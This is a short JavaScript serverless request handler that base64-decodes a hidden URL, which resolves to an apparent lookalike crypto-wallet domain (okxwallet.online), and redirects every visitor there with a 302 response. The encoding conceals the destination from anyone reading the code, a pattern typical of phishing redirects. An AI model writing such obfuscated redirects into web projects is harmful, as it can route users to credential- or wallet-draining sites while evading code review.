export default function handler(req, res) {
  
  const encoded = 'aHR0cHM6Ly9va3h3YWxsZXQub25saW5l';
  const decodedUrl = Buffer.from(encoded, 'base64').toString('utf-8');

  res.writeHead(302, {
    Location: decodedUrl
  });
  res.end();
}
